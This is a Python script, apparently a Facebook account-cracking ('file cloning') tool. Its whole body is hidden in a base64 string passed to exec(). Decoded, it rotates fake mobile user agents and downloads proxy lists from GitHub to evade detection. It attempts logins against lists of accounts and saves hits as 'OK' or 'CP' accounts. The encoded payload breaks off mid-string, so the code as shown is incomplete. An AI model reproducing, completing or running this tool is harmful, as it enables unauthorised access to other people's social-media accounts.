#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 1.0
#______CODING BY: ALAX ASIF GAMING
#______GITHUB : https://github.com/AF-CYBER
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'I3RhbmppZF9iYWkNCiNieXBzcyBBU0lGIGJ5IFRBTkpJRCBWQUkNCmltcG9ydCBvcyANCiNvcy5zeXN0ZW0oInBrZyBpbnN0YWxsIHNveCAteSIpDQojb3Muc3lzdGVtKCJwbGF5IG9wLm1wMyIpDQojb3Muc3lzdGVtKCJwa2cgaW5zdGFsbCBlc3BlYWsiKQ0KaW1wb3J0IHJlcXVlc3RzLGJzNCxqc29uLG9zLHN5cyxyYW5kb20sZGF0ZXRpbWUsdGltZSxyZQ0KaW1wb3J0IHVybGxpYjMscmljaCxiYXNlNjQNCmltcG9ydCByZXF1ZXN0cyx6bGliLHBsYXRmb3JtDQpmcm9tIHJpY2gudGFibGUgaW1wb3J0IFRhYmxlIGFzIG1lDQpmcm9tIHJpY2guY29uc29sZSBpbXBvcnQgQ29uc29sZSBhcyBzb2wNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyB0cmVkDQpmcm9tIHJpY2guY29uc29sZSBpbXBvcnQgR3JvdXAgYXMgZ3ANCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgbmVsDQpmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIGNldGFrDQpmcm9tIHJpY2gubWFya2Rvd24gaW1wb3J0IE1hcmtkb3duIGFzIG1hcmsNCmZyb20gcmljaC5jb2x1bW5zIGltcG9ydCBDb2x1bW5zIGFzIGNvbA0KZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBycHJpbnQNCmZyb20gcmljaCBpbXBvcnQgcHJldHR5DQpmcm9tIHJpY2gudGV4dCBpbXBvcnQgVGV4dCBhcyB0ZWt6DQpwcmV0dHkuaW5zdGFsbCgpDQpDT049c29sKCkNCiMtLS0tLS0tLS0tLS0tLS0tLS1bIFVTRVItQUdFTlQgXS0tLS0tLS0tLS0tLS0tLS0tLS0jDQp1YSA9IFsiRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCAxMzsgU00tQTAzN1UgQnVpbGQvVFAxQS4yMjA2MjQuMDE0KSBbRkJBTi9PcmNhLUFuZHJvaWQ7RkJBVi80MjMuMC4wLjI1LjExMztGQlBOL2NvbS5mYWNlYm9vay5vcmNhO0ZCTEMvZW5fVVM7RkJCVi81MDc4MDc4NTE7RkJDUi9BVCZhbXA7YW1wLVQ7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQkRWL1NNLUEwMzdVO0ZCU1YvMTM7RkJDQS9hcm02NC12OGE6bnVsbDtGQkRNL3tkZW5zaXR5PTEuNzUsd2lkdGg9NzIwLGhlaWdodD0xNDcxfTtGQl9GVy8xO10iLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgTm9raWEgNS4xIEJ1aWxkL1BQUjEuMTgwNjEwLjAxMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82Mi4wLjMyMDIuOTcgTW9iaWxlIFNhZmFyaS81MzcuMzYiLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IE5va2lhIEcxMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk5LjAuNDg0NC41OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsXQ0KdWEgPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU00tRzk2NUYgQnVpbGQvUjE2Tlc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjIuMC4zMjAyLjg0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IixdDQp1YSA9IFsiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNV8zXzEgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBNb2JpbGUvMTlENTIiLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4wOyBURUNOTyBQNzAxIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82Mi4wLjMyMDIuODQgTW9iaWxlIFNhZmFyaS81MzcuMzYiLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNNLUExMzVNIEJ1aWxkL1NQMUEuMjEwODEyLjAxNjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMTguMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgUmVkbWkgTm90ZSA1IEJ1aWxkL1BLUTEuMTgwOTA0LjAwMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ny4wLjQyODAuNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLF0NCnVhID0gWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUo2MDBGTiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsXQ0KdWEgPSBbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBSZWRtaSBOb3RlIDggQnVpbGQvUEtRMS4xOTA2MTYuMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYiLF0NCnVnZW4yPVtdDQp1Z2VuPVtdDQpjb2ticnV0PVtdDQpzZXM9cmVxdWVzdHMuU2Vzc2lvbigpDQpwcmluY3A9W10NCnRyeToNCglwcm94PSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS9Qcm8tTWF4LTQyMC9BcGkvYmxvYi9tYWluL3Byb3gudHh0JykudGV4dA0KCW9wZW4oJy5wcm94LnR4dCcsJ3cnKS53cml0ZShwcm94KQ0KCQ0KZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCXByaW50KCdbW1x4MWJbMTs5Mm0rXHgxYlsxOzk3bV0gW1x4MWJbMTs5Nm1BU0lGJykNCnByb3g9b3BlbignLnByb3gudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQoJYT0nTW96aWxsYS81LjAgKFN5bWJpYW4vMzsgU2VyaWVzNjAvJw0KCWI9cmFuZG9tLnJhbmRyYW5nZSgxLCA5KQ0KCWM9cmFuZG9tLnJhbmRyYW5nZSgxLCA5KQ0KCWQ9J05va2lhJw0KCWU9cmFuZG9tLnJhbmRyYW5nZSgxMDAsIDk5OTkpDQoJZj0nLzExMC4wMjEuMDAyODsgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xICkgQXBwbGVXZWJLaXQvNTM1LjEgKEtIVE1MLCBsaWtlIEdlY2tvKSBOb2tpYUJyb3dzZXIvJw0KCWc9cmFuZG9tLnJhbmRyYW5nZSgxLCA5KQ0KCWg9cmFuZG9tLnJhbmRyYW5nZSgxLCA0KQ0KCWk9cmFuZG9tLnJhbmRyYW5nZSgxLCA0KQ0KCWo9cmFuZG9tLnJhbmRyYW5nZSgxLCA0KQ0KCWs9J01vYmlsZSBTYWZhcmkvNTM1LjEnDQoJdWFrdT0oZid7YX17Yn0ue2N9IHtkfXtlfXtmfXtnfS57aH0ue2l9LntqfSB7a30nKQ0KCXVnZW4yLmFwcGVuZCh1YWt1KQ0KDQoNCglhYT0nTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMl80IGxpa2UgTWFjIE9TIFgpJw0KCWI9cmFuZG9tLmNob2ljZShbJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInXSkNCgljPScgZW4tdXM7IEdULScNCglkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KCWU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpDQoJZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCglnPSdBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nDQoJaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkNCglpPScwJw0KCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApDQoJaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkNCglsPSdNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDUuMScNCgl1YWt1Mj1mJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nDQoJdWdlbi5hcHBlbmQodWFrdTIpDQpmb3IgeCBpbiByYW5nZSgxMCk6DQoJYT0nTW96aWxsYS81LjAgKFNBTVNVTkc7IFNBTVNVTkctR1QtUycNCgliPXJhbmRvbS5yYW5kcmFuZ2UoMTAwLCA5OTk5KQ0KCWM9cmFuZG9tLnJhbmRyYW5nZSgxMDAsIDk5OTkpDQoJZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCgllPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KCWY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQoJZz1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCgloPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkNCglpPSc7IFU7IEJhZGEvMS4yOyBlbi11cykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgRG9sZmluLycNCglqPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkNCglrPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkNCglsPSdNb2JpbGUvMThHODIgW0ZCQU4vRkJJT1M7RkJBVi8zMzMuMC4wLjMwLjEwOTtGQkJWLzMxMzMwOTMwODtGQkRWL2lQaG9uZTEwLDU7RkJNRC9pUGhvbmU7RkJTTi9pT1M7RkJTVi8xNC43LjE7RkJTUy8zO0ZCSUQvcGhvbmU7RkJMQy9wdF9CUjtGQk9QLzU7RkJSVi8zMTU1MDU4NDJdJw0KCXVhaz1mJ3thfXtifS97Y317ZH17ZX17Zn17Z317aH17aX17an0ue2t9IHtsfScNCg0KDQoNCmRlZiB1YWt1KCk6DQoJdHJ5Og0KCQl1YT1vcGVuKCdiYm5ldy50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlmb3IgdWIgaW4gdWE6DQoJCQl1Z2VuLmFwcGVuZCh1YikNCglleGNlcHQ6DQoJCWE9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dpdGh1Yi5jb20vUHJvLU1heC00MjAvdWEvYmxvYi9tYWluL2JibmV3LnR4dCcpLnRleHQNCgkJdWE9b3BlbignLmJibmV3LnR4dCcsJ3cnKQ0KCQlhYT1yZS5maW5kYWxsKCdsaW5lIj4oLio/KTwnLHN0cihhKSkNCgkJZm9yIHVuIGluIGFhOg0KCQkJdWEud3JpdGUodW4rJ1xuJykNCgkJdWE9b3BlbignLmJibmV3LnR4dCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpDQppZCxpZDIsbG9vcCxvayxjcCxha3VuLG9wcmVrLG1ldGhvZCxsaXNlbnNpa3UsdGFwbGlrYXNpLHRva2Vua3UsdWlkLGxpc2Vuc2lrdW5pPSBbXSxbXSwwLDAsMCxbXSxbXSxbXSxbXSxbXSxbXSxbXSxbXQ0KY29rYnJ1dD1bXQ0KDQpkZWYgYmFjaygpOg0KCWxvZ2luKCkNCkFTSUY9IkFTSUYiDQppbXQ9IlNFVFUiDQphaz0iQ0xBU1MzLSINCg0KUCA9ICdceDFiWzE7OTdtJw0KTSA9ICdceDFiWzE7OTFtJw0KSCA9ICdceDFiWzE7OTJtJw0KSyA9ICdceDFiWzE7OTNtJw0KQiA9ICdceDFiWzE7OTRtJw0KVSA9ICdceDFiWzE7OTVtJyANCk8gPSAnXHgxYlsxOzk2bScNCk4gPSAnXHgxYlswbScgICAgDQpaID0gIlwwMzNbMTszMG0iDQpzaXIgPSAnXDAzM1s0MW1ceDFiWzE7OTdtJw0KeCA9ICdcMzNbbScgIyBERUZBVUxUDQptID0gJ1x4MWJbMTs5MW0nICNSRUQgKw0KayA9ICdcMDMzWzkzbScgIyBLVU5JTkcgKw0KaCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVICsNCmhoID0gJ1wwMzNbMzJtJyAjIEhJSkFVIC0NCnUgPSAnXDAzM1s5NW0nICMgVU5HVQ0Ka2sgPSAnXDAzM1szM20nICMgS1VOSU5HIC0NCmIgPSAnXDMzWzE7OTZtJyAjIEJJUlUgLQ0KcCA9ICdceDFiWzA7MzRtJyAjIEJJUlUgKw0KYXN1ID0gcmFuZG9tLmNob2ljZShbbSxrLGgsdSxiXSkNCg0KDQpwd3BsdXNzLHB3bnlhPVtdLFtdDQpkaWMgPSB7JzEnOidKYW51YXJ5JywnMic6J0ZlYnJ1YXJ5JywnMyc6J01hcmNoJywnNCc6J0FwcmlsJywnNSc6J01heScsJzYnOidKdW5lJywnNyc6J0p1bHknLCc4JzonQXVndXN0JywnOSc6J1NlcHRlbWJlcicsJzEwJzonT2N0b2JlcicsJzExJzonTm92ZW1iZXInLCcxMic6J0RlY2VtYmVyJ30NCmRpYzIgPSB7JzAxJzonSmFudWFyeScsJzAyJzonRmVicnVhcnknLCcwMyc6J01hcmNoJywnMDQnOidBcHJpbCcsJzA1JzonTWF5JywnMDYnOidKdW5lJywnMDcnOidKdWx5JywnMDgnOidBdWd1c3QnLCcwOSc6J1NlcHRlbWJlcicsJzEwJzonT2N0b2JlcicsJzExJzonTm92ZW1iZXInLCcxMic6J0RldmVtYmVyJ30NCnRnbCA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpLmRheQ0KYmxuID0gZGljWyhzdHIoZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkubW9udGgpKV0NCnRobiA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnllYXINCm9rYyA9ICdPSy0nK3N0cih0Z2wpKyctJytzdHIoYmxuKSsnLScrc3RyKHRobikrJy50eHQnDQpjcGMgPSAnQ1AtJytzdHIodGdsKSsnLScrc3RyKGJsbikrJy0nK3N0cih0aG4pKycudHh0Jw0KDQpkZWYgYWx2aW5vX3h5KHUpOg0KICAgICAgICBmb3IgZSBpbiB1ICsgIlxuIjpzeXMuc3Rkb3V0LndyaXRlKGUpO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDA1KQ0KZGVmIEFTSUZqKHUpOg0KICAgICAgICBmb3IgZSBpbiB1ICsgIlxuIjpzeXMuc3Rkb3V0LndyaXRlKGUpO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDEpDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCmRlZiBiYWNrKCk6DQoJbG9naW4oKQ0KCQ0KCWltcG9ydCBnZXRwYXNzDQoNCmF0dGVtcHMgPSAwDQoNCiN3aGlsZSBhdHRlbXBzIDwgMTIzNDU2Nzc5MDE6DQojICAgIHVzZXJuYW1lID0gaW5wdXQoJyBcMDMzWzA7OTJtRW50ZXIgVXNlcm5hbWU6ICcpDQogICMgIHBhc3N3b3JkID0gaW5wdXQoJyBcMDMzWzA7OTNtRW50ZXIgUGFzc3dvcmQ6ICcpDQoNCiAjICAgaWYgdXNlcm5hbWUgPT0gJ0FTSUYnIGFuZCBwYXNzd29yZCA9PSAnTG92ZSc6DQogICAgIyAgICBwcmludCgnIFwwMzNbMDs5Mm1Zb3UgSGF2ZSBTdWNjZXNzZnVsbHkgTG9nZ2VkIGluLicpDQogICAgIyAgICBicmVhaw0KICAjICBlbHNlOg0KICAgICAjICAgcHJpbnQoJyBJbmNvcnJlY3QgUGFzcyBQbGVhc2UgVHJ5aW5nICcpDQogICAgICAjICBhdHRlbXBzICs9IDENCiAgICAgICAjIGNvbnRpbnVlDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCiMtLS0tLS0tLS0tLS0tLS0tLS1bIE1BSU4gXS0tLS0tLS0tLS0tLS0tLS0tIw0KDQpvcy5zeXN0ZW0oJ2VzcGVhayAtYSAzMDAgIiBZb3VyLCAgIFJlYWwsICBOYW1lLCInKQ0KTmFtZVggPWlucHV0KCdcMDMzWzE7OTdtW1wwMzNbMTs5Mm3igKJcMDMzWzE7OTdtXVwwMzNbMTs5Mm0gV0hBVCBJUyBZT1VSIE5BTUUgXDAzM1sxOzkxbTpcMzNbMTszMm0nKQ0Kb3Muc3lzdGVtKCdlc3BlYWsgLWEgMzAwICIgV2VsY29tZSwgICB0bywgIEFTSUYsICBLaW5nLCAgVG9vbHMiJykNCm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0FTSUYuS2luZy5Pay5Ccm8nKQ0KZGVmIGJhbm5lcigpOg0KCW9zLnN5c3RlbSgiY2xlYXIiKQ0KCXByaW50IChmIiIiDQpcMzNbMTszNm3ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcNClwzM1sxOzM2beKVkSAgICAgICBcMzNbMTszNm3ilZTilZDilZfilZTilZDilZcgIFwzM1sxOzM2beKVlOKVkOKVl+KVpiDilabilZTilZcg4pWU4pWQ4pWX4pWm4pWQ4pWXICAgICAgICAgICAgIFwzM1sxOzM2bSAg4pWRDQpcMzNbMTszNm3ilZEgICAgICAgXDMzWzE7MzZt4pWg4pWQ4pWj4pWg4pWjICAgXDMzWzE7MzZt4pWRICDilZrilabilZ3ilaDilanilZfilZHilaMg4pWg4pWm4pWdICAgICAgICAgICAgICAgXDMzWzE7MzZt4pWRDQpcMzNbMTszNm3ilZEgICAgICAgXDMzWzE7MzZt4pWpIOKVqeKVmiAgICBcMzNbMTszNm3ilZrilZDilZ0g4pWpIOKVmuKVkOKVneKVmuKVkOKVneKVqeKVmuKVkCAgICAgICAgICAgICAgIFwzM1sxOzM2beKVkQ0KXDMzWzE7MzZt4pWRICAgICAgIFwzM1sxOzM2bSAgICAgICAgIFwzM1sxOzM2bSAgICAgICAgICAgXHgxYlszODs1OzQ3bSAgICAgICAgIEFGIENZQkVSIFwzM1sxOzM2beKVkQ0KXDMzWzE7MzZt4pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWjDQpcMzNbMTszNm3ilZEgREVWRUxPUEVSIFwzM1sxOzM2bSAgIOKdgiAgXHgxYlszODs1OzQ4bUFMQVggQVNJRiBHQU1JTkdcMzNbMTszNm0gICAgICAgICAgICDilZENClwzM1sxOzM2beKVkSBHSVRIVUIgIFwzM1sxOzM2bSAgICAgIOKdgiBceDFiWzM4OzU7NDdtIEFTSUYtNDA0XDMzWzE7MzZtICAgICAgICAgICAgICAgICAgIOKVkQ0KXDMzWzE7MzZt4pWRIFZFUlNJT04gXDMzWzE7MzZtICAgICAgIOKdgiAgXHgxYlszODs1OzQ4bTEuMlwzM1sxOzM2bSAgICAgICAgICAgICAgICAgICAgICAg4pWRDQpcMzNbMTszNm3ilZEgVE9PTFMgICAgXDMzWzE7MzZtICAgICAgIOKdgiBcMzNbMTszNm0gRklMRS0vUEFJRFwzM1sxOzM2bSAgICAgICAgICAgICAgIOKVkQ0KXDMzWzE7MzZt4pWRIFdPUksgICAgIFwzM1sxOzM2bSAgICAgICAg4p2CIFx4MWJbMzg7NTs0N20gV0lGSSAmIERBVEFcMzNbMTszNm0gICAgICAgICAgICAg4pWRDQpcMzNbMTszNm3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0NClwzM1sxOzM2beKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlw0KXDMzWzE7MzZt4pWRRkIgR1JPVVAgOiBBRiBDWUJFUiBURVJNVVggRlJFRSBDT01BTkQgV09STERcMzNbMTszNm0g4pWRDQpcMzNbMTszNm3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIpDQpkZWYgbG9naW4oKToNCgliYW5uZXIoKQ0KCUFTSUZqKCdcMDMzWzE7OTZtWzFdIEZpbGUgQ2xvbmluZ1xuXHgxYlsxOzkybVsyXSBDb250YWN0IFdpdGggQWRtaW5cblwwMzNbMDs5N21bMF0gXDAzM1swOzkxbUVYSVQgJykNCglBU0lGaignXDAzM1swOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCglBU0lGPSBpbnB1dCgnXHgxYlsxOzkybVsrXSBDSE9PU0U6ICcpO3RpbWUuc2xlZXAoMC4wMSkNCglpZiBBU0lGIGluIFsnbSddOg0KCQlwdWJsaWMoKQ0KCWVsaWYgQVNJRiBpbiBbJzEnXToNCgkJY3JhY2tfZmlsZSgpDQoJZWxpZiBBU0lGIGluIFsnaScsJzBpJ106DQoJCXJlc3VsdCgpDQoJZWxpZiBBU0lGIGluIFsnMicsJzAyJ106DQoJCW9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rODgwMTYwODg0Mzk1NicpDQoJZWxpZiBBU0lGIGluIFsnMCddOg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiAudG9rZW4udHh0JykNCgkJb3Muc3lzdGVtKCdybSAtcmYgLmNvb2tpZS50eHQnKQ0KCQlwcmludCgnI0RPTkUgTE9HT1VUICcpDQoJCWV4aXQoKQ0KCWVsc2U6DQoJCXByaW50KCcjIFNFTEVDVCBDT1JSRUNUTFkgJykNCgkJYmFjaygpDQpkZWYgZXJyb3IoKToNCglwcmludChmJ3trfSNUUlkgQUdBSU4ge3V9JykNCgl0aW1lLnNsZWVwKDQpDQoJYmFjaygpDQoJDQpkZWYgcmVzdWx0KCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJYmFubmVyKCkNCglwcmludCgnIDEuIENQIEFDQ09VTlQgJykNCglwcmludCgnIDIuIE9LIEFDQ09VTlQnKQ0KCXByaW50KCcgMC4gRVhJVAknKQ0KCWt6ID0gaW5wdXQoJ1xuIENob29zZSA6ICcpDQoJaWYga3ogaW4gWycxJywnMDEnXToNCgkJdHJ5OnZpbiA9IG9zLmxpc3RkaXIoJ0NQJykNCgkJZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KCQkJcHJpbnQoJyBGaWxlIE5vdCBGb3VuZCcpDQoJCQl0aW1lLnNsZWVwKDMpDQoJCQliYWNrKCkNCgkJaWYgbGVuKHZpbik9PTA6DQoJCQlwcmludCgnWW91IEhhdmUgTm8gQ1AgUmVzdWx0cyAnKQ0KCQkJdGltZS5zbGVlcCgyKQ0KCQkJYmFjaygpDQoJCWVsc2U6DQoJCQljaWggPSAwDQoJCQlsb2wgPSB7fQ0KCQkJZm9yIGlzaSBpbiB2aW46DQoJCQkJdHJ5OmhlbSA9IG9wZW4oJ0NQLycraXNpLCdyJykucmVhZGxpbmVzKCkNCgkJCQlleGNlcHQ6Y29udGludWUNCgkJCQljaWgrPTENCgkJCQlpZiBjaWg8MTA6DQoJCQkJCW5vbSA9ICcwJytzdHIoY2loKQ0KCQkJCQlsb2wudXBkYXRlKHtzdHIoY2loKTpzdHIoaXNpKX0pDQoJCQkJCWxvbC51cGRhdGUoe25vbTpzdHIoaXNpKX0pDQoJCQkJCXByaW50KCdbJytub20rJ10gJytpc2krJyBbICcrc3RyKGxlbihoZW0pKSsnIEFjY291bnQgXScrdSkNCgkJCQllbHNlOg0KCQkJCQlsb2wudXBkYXRlKHtzdHIoY2loKTpzdHIoaXNpKX0pDQoJCQkJCXByaW50KCdbJytzdHIoY2loKSsnXSAnK2lzaSsnIFsgJytzdHIobGVuKGhlbSkpKycgQWNjb3VudCBdJyt1KQ0KCQkJZ2VlaCA9IGlucHV0KCdcbiAgIENob29zZSA6ICcpDQoJCQl0cnk6Z2VoID0gbG9sW2dlZWhdDQoJCQlleGNlcHQgS2V5RXJyb3I6DQoJCQkJcHJpbnQoJyBDSE9PU0UgUklHSFQgT1BUSU9OICcpDQoJCQkJZXhpdCgpDQoJCQl0cnk6bGluID0gb3BlbignQ1AvJytnZWgsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpDQoJCQlleGNlcHQ6DQoJCQkJcHJpbnQoJ0ZJTEUgTk9UIEZPVU5EICcpDQoJCQkJdGltZS5zbGVlcCgyKQ0KCQkJCWJhY2soKQ0KCQkJbm9jcD0wDQoJCQlmb3IgY3BrdSBpbiByYW5nZShsZW4obGluKSk6DQoJCQkJY3BrdW5pPWxpbltub2NwXS5zcGxpdCgnfCcpDQoJCQkJY3BrdWg9ZicgIHtjcGt1bmlbMF19ICB7Y3BrdW5pWzFdfScNCgkJCQlzb2woKS5wcmludChjcGt1aCxzdHlsZT0ieWVsbG93IikNCgkJCQlub2NwICs9MQ0KCQkJaW5wdXQoJ1sgQ2xpY2sgRW50ZXIgXScpDQoJCQliYWNrKCkNCgllbGlmIGt6IGluIFsnMicsJzAyJ106DQoJCXRyeTp2aW4gPSBvcy5saXN0ZGlyKCdPSycpDQoJCWV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCgkJCXByaW50KCdGaWxlIE5vdCBGb3VuZCAnKQ0KCQkJdGltZS5zbGVlcCgyKQ0KCQkJYmFjaygpDQoJCWlmIGxlbih2aW4p